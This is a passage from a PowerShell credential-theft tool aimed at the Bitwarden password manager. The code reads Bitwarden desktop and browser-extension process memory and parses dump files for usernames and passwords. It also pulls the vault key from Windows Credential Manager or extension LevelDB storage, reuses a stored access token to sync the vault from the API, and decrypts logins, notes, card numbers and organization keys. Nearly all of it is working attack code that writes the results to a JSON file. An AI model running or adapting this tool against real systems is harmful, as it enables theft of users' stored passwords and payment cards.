        $str16 = [System.Text.Encoding]::Unicode.GetString($data)
        Find-CredentialPatterns -Text $str16 -Credentials $Credentials
    }

    if ($dumpStream) {
        $dumpStream.Close()
        Write-Status "  Dump saved: $dumpPath ($([math]::Round((Get-Item $dumpPath).Length / 1MB, 1))MB)" "good"
    }
    [BW.Mem]::Close($hProc)
    $found = $Credentials.Value.Count - $before
    Write-Status "  Raw matches: $found" $(if ($found -gt 0) { "good" } else { "info" })
}

function Invoke-BWDump {
    param([int]$TargetPid, [bool]$DoSaveDump, [string]$OutFile)

    Write-Status "MEMORY DUMP" "header"

    $credentials = @()

    # --- Desktop app processes ---
    $bwProcs = Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.ProcessName -match '(?i)^bitwarden$' }
    if ($TargetPid -gt 0) {
        $allProcs = Get-Process -ErrorAction SilentlyContinue
        $target = $allProcs | Where-Object { $_.Id -eq $TargetPid }
        if (-not $target) {
            Write-Status "PID $TargetPid not found" "bad"
            return
        }
        Scan-ProcessMemory -Target $target -Credentials ([ref]$credentials) -DoSaveDump $DoSaveDump -Label "Manual PID"
    } else {
        if ($bwProcs) {
            $target = $bwProcs | Sort-Object WorkingSet64 -Descending | Select-Object -First 1
            Write-Status "DESKTOP APP" "header"
            Scan-ProcessMemory -Target $target -Credentials ([ref]$credentials) -DoSaveDump $DoSaveDump -Label "Desktop"
        } else {
            Write-Status "No Bitwarden desktop process found" "info"
        }

        # --- Browser extension processes ---
        Write-Status "BROWSER EXTENSIONS (Memory)" "header"
        $browserPatterns = @{
            "Chrome"  = '^chrome$'
            "Brave"   = '^brave$'
            "Edge"    = '^msedge$'
            "Firefox" = '^firefox$'
            "Vivaldi" = '^vivaldi$'
        }
        $extIds = @{
            "Chrome"  = "nngceckbapebfimnlniiiahkandclblb"
            "Edge"    = "jbkfoedolllekgbhcbcoahefnbanhhlh"
            "Brave"   = "nngceckbapebfimnlniiiahkandclblb"
            "Vivaldi" = "nngceckbapebfimnlniiiahkandclblb"
        }
        $browsersFound = $false
        foreach ($browser in $browserPatterns.Keys) {
            $procs = Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.ProcessName -match $browserPatterns[$browser] }
            if (-not $procs) { continue }

            # Check if Bitwarden extension is installed for this browser
            $hasExt = $false
            if ($extIds.ContainsKey($browser)) {
                $userData = switch ($browser) {
                    "Chrome"  { "$env:LOCALAPPDATA\Google\Chrome\User Data" }
                    "Edge"    { "$env:LOCALAPPDATA\Microsoft\Edge\User Data" }
                    "Brave"   { "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data" }
                    "Vivaldi" { "$env:LOCALAPPDATA\Vivaldi\User Data" }
                    default   { "" }
                }
                if ($userData -and (Test-Path $userData)) {
                    $profiles = @("Default") + @(Get-ChildItem $userData -Directory -Filter "Profile *" -ErrorAction SilentlyContinue | ForEach-Object { $_.Name })
                    foreach ($prof in $profiles) {
                        if (Test-Path (Join-Path $userData "$prof\Local Extension Settings\$($extIds[$browser])")) {
                            $hasExt = $true; break
                        }
                    }
                }
            }
            if ($browser -eq "Firefox") {
                $fxProfiles = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -Directory -ErrorAction SilentlyContinue
                foreach ($fp in $fxProfiles) {
                    if (Get-ChildItem (Join-Path $fp.FullName "storage\default\moz-extension*") -Directory -ErrorAction SilentlyContinue) {
                        $hasExt = $true; break
                    }
                }
            }

            if (-not $hasExt) {
                Write-Verbose "$browser running but no Bitwarden extension found, skipping"
                continue
            }

            $browsersFound = $true
            $targets = @()
            if ($browser -ne "Firefox") {
                # Chromium: find --extension-process instances (service workers + extension renderers)
                foreach ($p in $procs) {
                    try {
                        $cmd = (Get-CimInstance Win32_Process -Filter "ProcessId=$($p.Id)" -ErrorAction SilentlyContinue).CommandLine
                        if ($cmd -match '--extension-process') {
                            $targets += $p
                        }
                    } catch {}
                }
                if ($targets.Count -gt 0) {
                    $targets = $targets | Sort-Object WorkingSet64 -Descending
                    Write-Status "$browser ($($procs.Count) procs, $($targets.Count) extension process(es))" "info"
                } else {
                    $targets = $procs | Sort-Object WorkingSet64 -Descending | Select-Object -First 3
                    Write-Status "$browser ($($procs.Count) procs, no --extension-process flag, scanning top 3)" "info"
                }
            } else {
                $targets = $procs | Sort-Object WorkingSet64 -Descending | Select-Object -First 3
                Write-Status "$browser ($($procs.Count) procs, scanning top 3)" "info"
            }
            foreach ($t in $targets) {
                Scan-ProcessMemory -Target $t -Credentials ([ref]$credentials) -DoSaveDump $false -Label "$browser ext"
            }
        }
        if (-not $browsersFound) {
            Write-Status "No browsers with Bitwarden extension detected" "info"
        }
    }

    if ($credentials.Count -eq 0 -and -not $bwProcs -and -not $TargetPid) {
        Write-Status "No Bitwarden processes (desktop or browser) found" "bad"
        return
    }

    # Filter out EncStrings, garbage, and deduplicate
    $encStrRe = '^\d\.[A-Za-z0-9+/=\\]{10,}'
    $filtered = $credentials | Where-Object {
        $_.Username -notmatch $encStrRe -and $_.Password -notmatch $encStrRe -and
        $_.Password.Length -lt 300 -and $_.Username.Length -lt 200
    }
    $unique = $filtered | Sort-Object { "$($_.Username)|$($_.Password)" } -Unique
    Write-Status "EXTRACTED CREDENTIALS" "header"
    if ($unique.Count -gt 0) {
        $i = 0
        foreach ($cred in $unique) {
            $i++
            Write-Host ""
            Write-Host "  [$i] " -NoNewline -ForegroundColor Green
            if ($cred.Name) { Write-Host "$($cred.Name) " -ForegroundColor White -NoNewline; Write-Host "(Memory)" -ForegroundColor DarkGray } else { Write-Host "" }
            if ($cred.URL) { Write-Host "      URL:  $($cred.URL)" -ForegroundColor Gray }
            if ($cred.Username) { Write-Host "      User: $($cred.Username)" -ForegroundColor Cyan }
            if ($cred.Password) { Write-Host "      Pass: $($cred.Password)" -ForegroundColor Yellow }
        }
        Write-Host ""
        Write-Status "Found $($unique.Count) credential(s) in memory" "good"
        Save-Results -Credentials $unique -OutputFile $OutFile
    } else {
        Write-Status "No credentials found in process memory" "warn"
        Write-Status "Vault may be locked, or credentials are encrypted in memory" "info"
    }
}

function Find-CredentialPatterns {
    param([string]$Text, [ref]$Credentials)

    # Bitwarden cipher JSON in memory: extract username/password/uri from decrypted vault items
    $jsonPattern = '"username"\s*:\s*"([^"]{1,200})"\s*,\s*"password"\s*:\s*"([^"]{1,500})"'
    $matches2 = [regex]::Matches($Text, $jsonPattern, [System.Text.RegularExpressions.RegexOptions]::IgnoreCase)
    foreach ($m in $matches2) {
        $user = $m.Groups[1].Value
        $pass = $m.Groups[2].Value
        # Skip encrypted EncStrings (including JSON-escaped unicode like + for +)
        if ($user -match '^\d\.[A-Za-z0-9+/=\\]{10,}' -or $pass -match '^\d\.[A-Za-z0-9+/=\\]{10,}') { continue }
        if ($pass.Length -gt 1 -and $user.Length -gt 1) {
            # Search surrounding context for uri and name (within 4000 chars before and 500 after)
            $ctxStart = [Math]::Max(0, $m.Index - 4000)
            $ctxEnd = [Math]::Min($Text.Length, $m.Index + $m.Length + 500)
            $context = $Text.Substring($ctxStart, $ctxEnd - $ctxStart)
            $urlMatch = [regex]::Match($context, '"uri"\s*:\s*"([^"]{5,500})"', [System.Text.RegularExpressions.RegexOptions]::IgnoreCase)
            $nameMatch = [regex]::Match($context, '"name"\s*:\s*"([^"]{1,100})"', [System.Text.RegularExpressions.RegexOptions]::IgnoreCase)
            $nameVal = ""
            if ($nameMatch.Success) {
                $n = $nameMatch.Groups[1].Value
                if ($n -notmatch '^\d\.[A-Za-z0-9+/=]') { $nameVal = $n }
            }
            $urlVal = ""
            if ($urlMatch.Success) { $urlVal = $urlMatch.Groups[1].Value }
            elseif ($nameVal -match '^\w[\w.-]+\.\w{2,}$') { $urlVal = "https://$nameVal" }
            $Credentials.Value += [PSCustomObject]@{
                Name     = $nameVal
                URL      = $urlVal
                Username = $user
                Password = $pass
            }
        }
    }

    # URL + credential proximity: restrict URL to valid URL chars (stop at JSON delimiters)
    $urlCredsPattern = '(https?://[A-Za-z0-9_.~:/?#\[\]@!$&''()*+,;=%-]{5,300})\s{1,50}([\w.+-]+@[\w.-]+\.\w{2,})\s{1,50}([^\s"''<>{}\[\]]{4,100})'
    $matches3 = [regex]::Matches($Text, $urlCredsPattern)
    foreach ($m in $matches3) {
        $url = $m.Groups[1].Value.TrimEnd('.,;')
        $pass = $m.Groups[3].Value.TrimEnd('.,;')
        # Skip if this looks like JSON structure (already handled by JSON pattern above)
        if ($pass -match '^[,{}\[\]":]' -or $url -match '"[,}:\[]') { continue }
        $Credentials.Value += [PSCustomObject]@{
            Name = ""; URL = $url
            Username = $m.Groups[2].Value.Trim(); Password = $pass
        }
    }
}

function Invoke-BWParseDump {
    param([string]$DumpFile, [string]$OutFile)
    Write-Status "PARSE DUMP FILE" "header"
    if (-not (Test-Path $DumpFile)) {
        Write-Status "Dump file not found: $DumpFile" "bad"
        return
    }
    $fileSize = (Get-Item $DumpFile).Length
    Write-Status "Parsing: $DumpFile ($([math]::Round($fileSize / 1MB, 1))MB)" "info"

    $credentials = @()
    $chunkSize = 10MB
    $overlap = 4096
    $stream = [System.IO.File]::OpenRead($DumpFile)
    $position = 0

    while ($position -lt $fileSize) {
        $readSize = [int][Math]::Min($chunkSize + $overlap, $fileSize - $position)
        $buffer = New-Object byte[] $readSize
        $stream.Position = $position
        $bytesRead = $stream.Read($buffer, 0, $readSize)
        if ($bytesRead -eq 0) { break }

        $text = [System.Text.Encoding]::UTF8.GetString($buffer, 0, $bytesRead)
        Find-CredentialPatterns -Text $text -Credentials ([ref]$credentials)

        $text16 = [System.Text.Encoding]::Unicode.GetString($buffer, 0, $bytesRead)
        Find-CredentialPatterns -Text $text16 -Credentials ([ref]$credentials)

        $position += $chunkSize
    }
    $stream.Close()

    $encStrRe = '^\d\.[A-Za-z0-9+/=\\]{10,}'
    $filtered = $credentials | Where-Object {
        $_.Username -notmatch $encStrRe -and $_.Password -notmatch $encStrRe -and
        $_.Password.Length -lt 300 -and $_.Username.Length -lt 200
    }
    $unique = $filtered | Sort-Object { "$($_.Username)|$($_.Password)" } -Unique
    Write-Status "EXTRACTED CREDENTIALS" "header"
    if ($unique.Count -gt 0) {
        $i = 0
        foreach ($cred in $unique) {
            $i++
            Write-Host ""
            Write-Host "  [$i] " -NoNewline -ForegroundColor Green
            if ($cred.Name) { Write-Host "$($cred.Name) " -ForegroundColor White -NoNewline; Write-Host "(Memory)" -ForegroundColor DarkGray } else { Write-Host "" }
            if ($cred.URL) { Write-Host "      URL:  $($cred.URL)" -ForegroundColor Gray }
            if ($cred.Username) { Write-Host "      User: $($cred.Username)" -ForegroundColor Cyan }
            if ($cred.Password) { Write-Host "      Pass: $($cred.Password)" -ForegroundColor Yellow }
        }
        Write-Host ""
        Write-Status "Found $($unique.Count) credential(s)" "good"
        Save-Results -Credentials $unique -OutputFile $OutFile
    } else {
        Write-Status "No credentials found in dump file" "warn"
    }
}

# ============================================================================
#  Offline Decrypt Mode
# ============================================================================

function Invoke-BWOffline {
    param([string]$ApiBaseUrl, [string]$OutFile)

    Write-Status "OFFLINE VAULT DECRYPTION" "header"

    # --- Step 1: Find the UserKey ---
    Write-Status "STEP 1: Locate UserKey" "header"
    $userKeyBytes = $null
    $userKeySource = ""

    # Try Credential Manager first (desktop app)
    $credEntries = @()
    foreach ($filter in @("Bitwarden*", "bitwarden*")) {
        try { $credEntries += [BW.CredMgr]::Enumerate($filter) } catch {}
    }
    $autoKeyCreds = $credEntries | Where-Object { $_.TargetName -match 'auto' }
    foreach ($akc in $autoKeyCreds) {
        Write-Status "Found auto-unlock credential: $($akc.TargetName)" "good"
        $b64 = $null
        $candidates = @()
        if ($akc.BlobAsUtf16) { $candidates += $akc.BlobAsUtf16.TrimEnd("`0").Trim('"') }
        if ($akc.BlobAsUtf8)  { $candidates += $akc.BlobAsUtf8.TrimEnd("`0").Trim('"') }
        foreach ($c in $candidates) {
            if ($c -match '^[A-Za-z0-9+/=]{44,}$') { $b64 = $c; break }
        }
        if ($b64) {
            try {
                $userKeyBytes = [Convert]::FromBase64String($b64)
                if ($userKeyBytes.Length -ge 32) {
                    Write-Status "UserKey extracted from Credential Manager ($($userKeyBytes.Length) bytes)" "good"
                    $userKeySource = "CredentialManager"
                    break
                }
            } catch { Write-Verbose "Base64 decode failed for $($akc.TargetName)" }
        }
    }

    # Try browser extension LevelDB (plaintext in chrome.storage.local)
    if (-not $userKeyBytes) {
        Write-Status "Credential Manager empty, scanning browser extension LevelDB..." "warn"
        $extPaths = @{
            "Chrome"  = "$env:LOCALAPPDATA\Google\Chrome\User Data"
            "Edge"    = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
        }
        $extIds = @{
            "Chrome"  = "nngceckbapebfimnlniiiahkandclblb"
            "Edge"    = "jbkfoedolllekgbhcbcoahefnbanhhlh"
        }
        foreach ($browser in $extPaths.Keys) {
            if ($userKeyBytes) { break }
            $userData = $extPaths[$browser]
            if (-not (Test-Path $userData)) { continue }
            $profiles = @("Default") + @(Get-ChildItem $userData -Directory -Filter "Profile *" -ErrorAction SilentlyContinue | ForEach-Object { $_.Name })
            foreach ($prof in $profiles) {
                $extPath = Join-Path $userData "$prof\Local Extension Settings\$($extIds[$browser])"
                if (-not (Test-Path $extPath)) { continue }
                $files = Get-ChildItem $extPath -File -ErrorAction SilentlyContinue |
                    Where-Object { $_.Extension -in @('.ldb', '.log', '.sst') }
                foreach ($f in $files) {
                    try {
                        $raw = [System.IO.File]::ReadAllBytes($f.FullName)
                        $text = [System.Text.Encoding]::UTF8.GetString($raw)
                        $idx = $text.IndexOf('_user_auto')
                        if ($idx -ge 0) {
                            $searchArea = $text.Substring([Math]::Max(0, $idx - 100), [Math]::Min(600, $text.Length - [Math]::Max(0, $idx - 100)))
                            $b64Matches = [regex]::Matches($searchArea, '[A-Za-z0-9+/]{60,}={0,2}')
                            foreach ($bm in $b64Matches) {
                                try {
                                    $decoded = [Convert]::FromBase64String($bm.Value)
                                    if ($decoded.Length -ge 32 -and $decoded.Length -le 128) {
                                        $userKeyBytes = $decoded
                                        $userKeySource = "LevelDB ($browser - $prof)"
                                        Write-Status "UserKey extracted from LevelDB: $browser ($($decoded.Length) bytes)" "good"
                                        break
                                    }
                                } catch {}
                            }
                        }
                    } catch {}
                    if ($userKeyBytes) { break }
                }
                if ($userKeyBytes) { break }
            }
        }
    }

    if (-not $userKeyBytes) {
        Write-Status "No UserKey found. Vault timeout is not 'Never' or auto-unlock is not configured." "bad"
        Write-Status "Try -Dump mode for memory extraction instead." "info"
        return
    }

    # Split UserKey into EncKey + MacKey
    $keyParts = Get-KeyParts -KeyBytes $userKeyBytes
    if (-not $keyParts) {
        Write-Status "Invalid UserKey (too short)" "bad"
        return
    }
    $encKey = $keyParts.EncKey
    $macKey = $keyParts.MacKey
    Write-Status "UserKey split: EncKey($($encKey.Length)B) + MacKey($($macKey.Length)B)" "info"

    # --- Step 2: Find encrypted vault data ---
    Write-Status "STEP 2: Locate Encrypted Vault Data" "header"
    $ciphers = @()
    $privateKeyEnc = $null
    $script:orgKeysEnc = @{}

    # Try data.json (desktop app) - modern flat key format
    $userProfiles = Get-ChildItem "C:\Users" -Directory -ErrorAction SilentlyContinue |
        Where-Object { $_.Name -notin @('Public', 'Default', 'Default User', 'All Users') }
    foreach ($profile in $userProfiles) {
        foreach ($djDir in @("Bitwarden", "Bitwarden CLI")) {
            $djPath = Join-Path $profile.FullName "AppData\Roaming\$djDir\data.json"
            if (-not (Test-Path $djPath)) { continue }
            Write-Status "Parsing $djPath..." "info"
            try {
                $json = Get-Content $djPath -Raw -ErrorAction Stop | ConvertFrom-Json
                $allProps = @{}
                $json.PSObject.Properties | ForEach-Object { $allProps[$_.Name] = $_.Value }

                # Find user IDs from modern format
                $userIds = @()
                if ($allProps.ContainsKey('global_account_activeAccountId')) {
                    $userIds += $allProps['global_account_activeAccountId']
                }
                $allProps.Keys | ForEach-Object {
                    if ($_ -match '^user_([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})_') {
                        if ($Matches[1] -notin $userIds) { $userIds += $Matches[1] }
                    }
                }
                # Legacy format: UUID as top-level key
                $allProps.Keys | ForEach-Object {
                    if ($_ -match '^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$') {
                        if ($_ -notin $userIds) { $userIds += $_ }
                    }
                }

                foreach ($uid in $userIds) {
                    # Modern format: encrypted private key in accountCryptographicState
                    $cryptoStateKey = "user_${uid}_crypto_accountCryptographicState"
                    if ($allProps.ContainsKey($cryptoStateKey)) {
                        $cs = $allProps[$cryptoStateKey]
                        if ($cs.PSObject.Properties['V1'] -and $cs.V1.PSObject.Properties['private_key']) {
                            $privateKeyEnc = $cs.V1.private_key
                            Write-Status "  Found encrypted RSA private key (V1 format)" "good"
                        }
                    }

                    # Modern format: ciphers
                    $ciphersKey = "user_${uid}_ciphers_ciphers"
                    if ($allProps.ContainsKey($ciphersKey) -and $allProps[$ciphersKey] -is [PSObject]) {
                        $allProps[$ciphersKey].PSObject.Properties | ForEach-Object {
                            $ciphers += $_.Value
                        }
                        Write-Status "  Found $($ciphers.Count) cached ciphers" "good"
                    }

                    # Organization keys (for org cipher decryption)
                    $orgKeysKey = "user_${uid}_crypto_organizationKeys"
                    if ($allProps.ContainsKey($orgKeysKey) -and $allProps[$orgKeysKey] -is [PSObject]) {
                        $script:orgKeysEnc = @{}
                        $allProps[$orgKeysKey].PSObject.Properties | ForEach-Object {
                            $script:orgKeysEnc[$_.Name] = $_.Value
                        }
                        Write-Status "  Found $($script:orgKeysEnc.Count) organization key(s)" "info"
                    }

                    # Legacy format fallback
                    if ($ciphers.Count -eq 0 -and $allProps.ContainsKey($uid)) {
                        $legacy = $allProps[$uid]
                        if ($legacy -is [PSObject]) {
                            if ($legacy.PSObject.Properties['data'] -and $legacy.data.PSObject.Properties['ciphers']) {
                                $cd = $legacy.data.ciphers
                                if ($cd.PSObject.Properties['encrypted']) {
                                    $cd.encrypted.PSObject.Properties | ForEach-Object { $ciphers += $_.Value }
                                }
                            }
                            if (-not $privateKeyEnc -and $legacy.PSObject.Properties['keys']) {
                                $pk = $legacy.keys
                                if ($pk.PSObject.Properties['privateKey']) {
                                    $privateKeyEnc = if ($pk.privateKey -is [PSObject] -and $pk.privateKey.PSObject.Properties['encrypted']) { $pk.privateKey.encrypted } else { $pk.privateKey }
                                }
                            }
                        }
                    }
                }
            } catch { Write-Verbose "Failed to parse data.json: $_" }
        }
    }

    # Try API sync if we have no cached ciphers
    if ($ciphers.Count -eq 0) {
        Write-Status "No cached ciphers in data.json, attempting API sync..." "warn"
        $accessToken = $null

        # Look for access token in data.json (modern format: user_{uid}_token_accessToken)
        foreach ($profile in $userProfiles) {
            if ($accessToken) { break }
            $djPath = Join-Path $profile.FullName "AppData\Roaming\Bitwarden\data.json"
            if (-not (Test-Path $djPath)) { continue }
            try {
                $json = Get-Content $djPath -Raw -ErrorAction Stop | ConvertFrom-Json
                $json.PSObject.Properties | ForEach-Object {
                    if ($_.Name -match 'token_accessToken$' -and $_.Value -is [string] -and $_.Value.Length -gt 20) {
                        $accessToken = $_.Value
                    }
                }
            } catch {}
        }

        if ($accessToken) {
            # Determine API URL: official Bitwarden uses api.bitwarden.com, self-hosted uses {url}/api
            $syncUrl = if ($ApiBaseUrl -match 'vault\.bitwarden\.com') {
                "https://api.bitwarden.com/sync"
            } else {
                "$ApiBaseUrl/api/sync"
            }
            Write-Status "Syncing vault from $syncUrl..." "info"
            try {
                $headers = @{ "Authorization" = "Bearer $accessToken" }
                $sync = Invoke-RestMethod -Uri $syncUrl -Headers $headers -Method Get -ErrorAction Stop
                if ($sync.ciphers) {
                    $ciphers = @($sync.ciphers)
                    if ($sync.profile -and $sync.profile.privateKey) {
                        $privateKeyEnc = $sync.profile.privateKey
                    }
                    Write-Status "Synced $($ciphers.Count) ciphers from API" "good"
                }
            } catch {
                Write-Status "API sync failed: $_ (token may be expired)" "bad"
            }
        } else {
            Write-Status "No access token found for API sync" "warn"
        }
    }

    if ($ciphers.Count -eq 0) {
        Write-Status "No ciphers found to decrypt" "bad"
        return
    }
    Write-Status "Found $($ciphers.Count) ciphers to decrypt" "info"

    # --- Step 3: Decrypt ---
    Write-Status "STEP 3: Decrypt Vault" "header"
    $decrypted = @()

    # Decrypt RSA private key (for org ciphers)
    $privateKeyDer = $null
    if ($privateKeyEnc) {
        $privateKeyDer = Decrypt-EncStringToBytes -EncString $privateKeyEnc -EncKey $encKey -MacKey $macKey
        if ($privateKeyDer) {
            Write-Status "RSA private key decrypted ($($privateKeyDer.Length) bytes)" "good"
        } else {
            Write-Status "Failed to decrypt RSA private key" "warn"
        }
    }

    # Pre-decrypt organization keys
    $orgKeys = @{}
    if ($privateKeyDer -and $script:orgKeysEnc) {
        foreach ($orgId in $script:orgKeysEnc.Keys) {
            $orgEntry = $script:orgKeysEnc[$orgId]
            $orgKeyEnc = $null
            if ($orgEntry -is [string]) { $orgKeyEnc = $orgEntry }
            elseif ($orgEntry -is [PSObject] -and $orgEntry.PSObject.Properties['key']) { $orgKeyEnc = $orgEntry.key }
            if ($orgKeyEnc) {
                $parsed = Split-EncString $orgKeyEnc
                if ($parsed -and $parsed.Type -eq 4) {
                    $ct = [Convert]::FromBase64String($parsed.CT)
                    $orgKeyBytes = Decrypt-RsaOaepSha1 -CT $ct -PrivateKeyDer $privateKeyDer
                    if ($orgKeyBytes) {
                        $orgKeys[$orgId] = Get-KeyParts -KeyBytes $orgKeyBytes
                        Write-Verbose "Decrypted org key for $orgId"
                    }
                }
            }
        }
        if ($orgKeys.Count -gt 0) {
            Write-Status "Decrypted $($orgKeys.Count) organization key(s)" "good"
        }
    }

    foreach ($cipher in $ciphers) {
        $cipherObj = if ($cipher -is [PSObject]) { $cipher } else { continue }
        $cipherType = 0
        if ($cipherObj.PSObject.Properties['type']) { $cipherType = $cipherObj.type }

        # Determine decryption key: cipher key > org key > UserKey
        $cEncKey = $encKey
        $cMacKey = $macKey
        if ($cipherObj.PSObject.Properties['key'] -and $cipherObj.key) {
            $cipherKeyBytes = Decrypt-EncStringToBytes -EncString $cipherObj.key -EncKey $encKey -MacKey $macKey
            if ($cipherKeyBytes) {
                $ckp = Get-KeyParts -KeyBytes $cipherKeyBytes
                if ($ckp) { $cEncKey = $ckp.EncKey; $cMacKey = $ckp.MacKey }
            }
        } elseif ($cipherObj.PSObject.Properties['organizationId'] -and $cipherObj.organizationId) {
            $oid = $cipherObj.organizationId
            if ($orgKeys.ContainsKey($oid)) {
                $cEncKey = $orgKeys[$oid].EncKey
                $cMacKey = $orgKeys[$oid].MacKey
            }
        }

        $name = ""
        if ($cipherObj.PSObject.Properties['name'] -and $cipherObj.name) {
            $name = Decrypt-EncString -EncString $cipherObj.name -EncKey $cEncKey -MacKey $cMacKey
        }

        $result = [PSCustomObject]@{ Name = $name; Type = $cipherType; URL = ""; Username = ""; Password = ""; Notes = ""; CardNumber = ""; }

        switch ($cipherType) {
            1 { # Login
                $login = $cipherObj.login
                if ($login) {
                    if ($login.PSObject.Properties['username'] -and $login.username) {
                        $result.Username = Decrypt-EncString -EncString $login.username -EncKey $cEncKey -MacKey $cMacKey
                    }
                    if ($login.PSObject.Properties['password'] -and $login.password) {
                        $result.Password = Decrypt-EncString -EncString $login.password -EncKey $cEncKey -MacKey $cMacKey
                    }
                    if ($login.PSObject.Properties['uris'] -and $login.uris) {
                        $uris = @()
                        foreach ($u in $login.uris) {
                            if ($u.PSObject.Properties['uri'] -and $u.uri) {
                                $decUri = Decrypt-EncString -EncString $u.uri -EncKey $cEncKey -MacKey $cMacKey
                                if ($decUri) { $uris += $decUri }
                            }
                        }
                        $result.URL = $uris -join ", "
                    }
                }
            }
            2 { # Secure Note
                if ($cipherObj.PSObject.Properties['notes'] -and $cipherObj.notes) {
                    $result.Notes = Decrypt-EncString -EncString $cipherObj.notes -EncKey $cEncKey -MacKey $cMacKey
                }
            }
            3 { # Card
                $card = $cipherObj.card
                if ($card) {
                    if ($card.PSObject.Properties['number'] -and $card.number) {
                        $result.CardNumber = Decrypt-EncString -EncString $card.number -EncKey $cEncKey -MacKey $cMacKey
                    }
                    if ($card.PSObject.Properties['code'] -and $card.code) {
                        $result.Password = Decrypt-EncString -EncString $card.code -EncKey $cEncKey -MacKey $cMacKey
                    }
                }
            }
        }

        if ($result.Name -or $result.Username -or $result.Password -or $result.Notes -or $result.CardNumber) {
            $decrypted += $result
        }
    }

    # Display results
    Write-Status "DECRYPTED VAULT" "header"
    if ($decrypted.Count -gt 0) {
        $i = 0
        $typeNames = @{ 1 = "Login"; 2 = "Note"; 3 = "Card"; 4 = "Identity" }
        foreach ($d in $decrypted) {
            $i++
            $tn = if ($typeNames.ContainsKey([int]$d.Type)) { $typeNames[[int]$d.Type] } else { "Item" }
            Write-Host ""
            Write-Host "  [$i] " -NoNewline -ForegroundColor Green
            Write-Host "$($d.Name)" -ForegroundColor White -NoNewline
            Write-Host " ($tn)" -ForegroundColor DarkGray
            if ($d.URL)        { Write-Host "      URL:  $($d.URL)" -ForegroundColor Gray }
            if ($d.Username)   { Write-Host "      User: $($d.Username)" -ForegroundColor Cyan }
            if ($d.Password)   { Write-Host "      Pass: $($d.Password)" -ForegroundColor Yellow }
            if ($d.CardNumber) { Write-Host "      Card: $($d.CardNumber)" -ForegroundColor Yellow }
            if ($d.Notes)      {
                $notePreview = if ($d.Notes.Length -gt 80) { $d.Notes.Substring(0, 80) + "..." } else { $d.Notes }
                Write-Host "      Note: $notePreview" -ForegroundColor DarkYellow
            }
        }
        Write-Host ""
        Write-Status "Decrypted $($decrypted.Count) / $($ciphers.Count) vault items" "good"
        Save-Results -Credentials $decrypted -OutputFile $OutFile
    } else {
        Write-Status "Failed to decrypt any ciphers - key may not match this vault" "bad"
    }
}

# ============================================================================
#  Output
# ============================================================================

function Save-Results {
    param($Credentials, [string]$OutputFile)
    if (-not $Credentials -or $Credentials.Count -eq 0) { return }
    try {
        $Credentials | ConvertTo-Json -Depth 5 | Out-File -FilePath $OutputFile -Encoding UTF8
        Write-Status "Results saved to: $OutputFile" "good"
    } catch {
        Write-Status "Failed to save results: $_" "bad"
    }
}

# ============================================================================
#  Main Function
# ============================================================================

function Invoke-BitwardenDump {
    [CmdletBinding(DefaultParameterSetName = 'Help')]
    param(
        [Parameter(ParameterSetName = 'Recon')][switch]$Recon,
        [Parameter(ParameterSetName = 'Dump')][switch]$Dump,
        [Parameter(ParameterSetName = 'Offline')][switch]$Offline,
        [Parameter(ParameterSetName = 'Parse')][string]$ParseDump,
        [Parameter(ParameterSetName = 'All')][switch]$All,
        [int]$TargetPid = 0,
        [string]$ApiUrl = "https://vault.bitwarden.com",
        [switch]$SaveDump,
        [string]$OutputFile = "credentials.json",
        [Alias('h')][switch]$Help
    )

    Show-Banner

    $noMode = -not $Recon -and -not $Dump -and -not $Offline -and -not $ParseDump -and -not $All
    if ($Help -or $noMode) {
        Show-Help
        return
    }

    $startTime = Get-Date
    $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    Write-Status "Running as: $currentUser $(if ($isAdmin) { '(ADMIN)' } else { '(standard user)' })" "info"
    Write-Status "Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" "info"

    if ($Recon -or $All) {
        Invoke-BWRecon
    }

    if ($Dump) {
        Invoke-BWDump -TargetPid $TargetPid -DoSaveDump $SaveDump.IsPresent -OutFile $OutputFile
    }

    if ($ParseDump) {
        Invoke-BWParseDump -DumpFile $ParseDump -OutFile $OutputFile
    }

    if ($Offline) {
        Invoke-BWOffline -ApiBaseUrl $ApiUrl -OutFile $OutputFile
    }

    if ($All) {
        # Auto-select best attack after recon
        $autoKeyCred = $script:credEntries | Where-Object { $_.TargetName -match 'auto' }
        $hasLevelDbKey = $false
        foreach ($ext in $script:browserExtPaths) {
            $found = Scan-LevelDbForKeys -ExtPath $ext.Path
            if ($found | Where-Object { $_.Type -match 'user_auto' }) { $hasLevelDbKey = $true }
        }
        if ($autoKeyCred -or $hasLevelDbKey) {
            Write-Status "Auto-selecting: OFFLINE DECRYPT" "warn"
            Invoke-BWOffline -ApiBaseUrl $ApiUrl -OutFile $OutputFile
        }
        # Always try memory dump (desktop + browser) in -All mode
        $bwProcs = Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.ProcessName -match '(?i)^bitwarden$' }
        $browserProcs = Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.ProcessName -match '(?i)^(chrome|brave|msedge|firefox|vivaldi)$' }
        if ($bwProcs -or $browserProcs) {
            Write-Status "Auto-selecting: MEMORY DUMP (desktop + browser)" "warn"
            Invoke-BWDump -TargetPid $TargetPid -DoSaveDump $SaveDump.IsPresent -OutFile $OutputFile
        } elseif (-not $autoKeyCred -and -not $hasLevelDbKey) {
            Write-Status "No viable attack path found" "bad"
        }
    }

    $elapsed = (Get-Date) - $startTime
    Write-Host ""
    Write-Status "Completed in $([math]::Round($elapsed.TotalSeconds, 1))s" "info"
}

# ============================================================================
#  Entry Point
# ============================================================================

Invoke-BitwardenDump @PSBoundParameters
